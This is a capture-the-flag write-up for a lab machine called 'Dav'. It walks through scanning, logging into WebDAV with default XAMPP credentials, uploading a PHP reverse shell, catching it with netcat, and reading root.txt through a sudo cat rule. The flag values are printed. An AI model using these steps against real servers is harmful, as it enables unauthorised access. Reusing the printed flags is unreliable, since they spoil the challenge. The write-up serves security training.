# Dav
----

## Port Scanning
```sh
└─$ sudo nmap 10.10.236.5 

Nmap scan report for 10.10.236.5
Host is up (0.41s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http


```
## Directories
```sh
└─$ gobuster dir -u http://10.10.236.5/ -w /usr/share/wordlists/dirb/common.txt -o directory.txt

/webdav               (Status: 401) [Size: 458]

```
![alt text](image.png)

- It requires username and password

## Searching for vulnerabilities
```sh
└─$ searchsploit webdav 
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Apache 1.3.12 - WebDAV Directory Listings                   | linux/remote/20210.txt
Apache JackRabbit - WebDAV XML External Entity              | java/webapps/37110.py
Apache Tomcat - 'WebDAV' Remote File Disclosure             | multiple/remote/4530.pl
Apache Tomcat - WebDAV SSL Remote File Disclosure           | linux/remote/4552.pl
Copy to WebDAV 1.1 iOS - Multiple Vulnerabilities           | ios/webapps/27655.txt
Liferay 6.0.x - WebDAV File Reading                         | multiple/remote/18763.txt
Microsoft IIS - WebDAV 'ntdll.dll' Remote Overflow          | windows/remote/1.c
Microsoft IIS - WebDav 'ScStoragePathFromUrl' Remote Overfl | windows/remote/41992.rb
Microsoft IIS - WebDAV Write Access Code Execution (Metaspl | windows/remote/16471.rb
Microsoft IIS - WebDAV XML Denial of Service (MS04-030)     | windows/dos/585.pl
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll. | windows/remote/22365.pl
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll. | windows/remote/22366.c
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll. | windows/remote/22367.txt
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll. | windows/remote/22368.txt
Microsoft IIS 5.0 - WebDAV 'ntdll.dll' Path Overflow (MS03- | windows/remote/16470.rb
Microsoft IIS 5.0 - WebDAV Denial of Service                | windows/dos/20664.pl
Microsoft IIS 5.0 - WebDAV Lock Method Memory Leak Denial o | windows/dos/20854.txt
Microsoft IIS 5.0 - WebDAV PROPFIND / SEARCH Method Denial  | windows/dos/22670.c
Microsoft IIS 5.0 - WebDAV Remote                           | windows/remote/2.c
Microsoft IIS 5.0 - WebDAV Remote Code Execution (3) (xwdav | windows/remote/51.c
Microsoft IIS 5.1 - WebDAV HTTP Request Source Code Disclos | windows/remote/26230.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Bu | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass     | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1) | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2) | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Pa | windows/remote/8754.patch
Microsoft Windows - WebDAV Remote Code Execution (2)        | windows/remote/36.c
Microsoft Windows 7 - 'WebDAV' Local Privilege Escalation ( | windows/local/39788.txt
Microsoft Windows 7 SP1 (x86) - 'WebDAV' Local Privilege Es | windows_x86/local/39432.c
Microsoft Windows 7 SP1 - 'mrxdav.sys' WebDAV Privilege Esc | windows/local/40085.rb
Microsoft Windows 8.1 - Local WebDAV NTLM Reflection Privil | windows/local/36424.txt
Neon WebDAV Client Library 0.2x - Format String             | linux/dos/23999.txt
Nginx 0.7.61 - WebDAV Directory Traversal                   | multiple/remote/9829.txt
Sun Java System Web Server 6.1/7.0 - WebDAV Format String   | multiple/dos/33560.txt
Sun Java Web Server - System WebDAV OPTIONS Buffer Overflow | multiple/remote/16314.rb
WebDAV - Application DLL Hijacker (Metasploit)              | windows/remote/16550.rb
XAMPP - WebDAV PHP Upload (Metasploit)                      | windows/remote/18367.rb
------------------------------------------------------------ ---------------------------------
------------------------------------------------------------ ---------------------------------
 Shellcode Title                                            |  Path
------------------------------------------------------------ ---------------------------------
Windows/x86 - Download File (//192.168.1.19/c) Via WebDAV + | windows_x86/39519.c
------------------------------------------------------------ ---------------------------------

```

- There is a lot of vulnerabilities in the webdav
- Lets try metasploit

```sh
msf6 > search webdav

   60  exploit/windows/http/xampp_webdav_upload_php                                           2012-01-14       excellent  No     XAMPP WebDAV PHP Upload


Interact with a module by name or index. For example info 60, use 60 or use exploit/windows/http/xampp_webdav_upload_php

msf6 > use 60

msf6 exploit(windows/http/xampp_webdav_upload_php) > show options

Module options (exploit/windows/http/xampp_webdav_upload_php):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The filename to give the payload. (Leave Blank for R
                                        andom)
   PASSWORD  xampp            yes       The HTTP password to specify for authentication
   PATH      /webdav/         yes       The path to attempt to upload
   Proxies                    no        A proxy chain of format type:host:port[,type:host:po
                                        rt][...]
   RHOSTS    10.10.236.5      yes       The target host(s), see https://docs.metasploit.com/
                                        docs/using-metasploit/basics/using-metasploit.html
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  wampp            yes       The HTTP username to specify for authentication
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.14.86.101     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic





```
- Here we find a default username and a password for webdav lets try it. Its worked!!

![alt text](image-1.png)

- Our php reverse shell has been attached there lets try it

- I should work but its not working . As we have password and the username we can get into webdav terminal thorough our kali machine

```sh
└─$ cadaver http://10.10.236.5/webdav/
Authentication required for webdav on server `10.10.236.5':
Username: wampp
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        M5WDGB5.php                         1113  Aug 12 17:45
        passwd.dav                            44  Aug 25  2019
dav:/webdav/> cat M5WDGB5.php
/*dav:/webdav/> 

```
- As we can see that our php shell hasn't been written well.
- lets add the php shell from our pc
- For that the php shell should be at the same directory where we are using the webdav

```sh
└─$ cp '/usr/share/webshells/php/php-reverse-shell.php' 'hello.php'
                                                         
┌──(*****㉿kali)-[~/CTF{}/THM/dav]
└─$ ls
5932.txt       hashed.txt  ports.txt
directory.txt  hello.php   quick.py
                                     
```
![alt text](image-2.png)
```sh
dav:/webdav/> put hello.php 
Uploading hello.php to `/webdav/hello.php':
Progress: [                              ]   0Progress: [=============================>] 100.0% of 5491 bytes succeeded.
dav:/webdav/> 

```

![alt text](image-3.png)

```sh
└─$ nc -nvlp 1234       
listening on [any] 1234 ...
connect to [10.14.86.101] from (UNKNOWN) [10.10.236.5] 53514
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 15:10:49 up 43 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
etc
home
opt
proc
root
run
$ cd home
$ ls
merlin
wampp
$ cd merlin
$ ls 
user.txt
$ cat user.txt  
449b40fe93f78a938523b7e4dcd66d2a
```
> ### user.txt : `449b40fe93f78a938523b7e4dcd66d2a`

```sh
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
$ 

```
- lets find the rootflag.txt

```sh
$ find / -name root.txt 
find: '/root': Permission denied

```
- Its in there but I don't have permission
- From `sudo -l` we found that we can use the `sudo cat` lets try
```sh
$ sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5

```
> ### root.txt : `101101ddc16b0cdf65ba0b8a7af7afa5`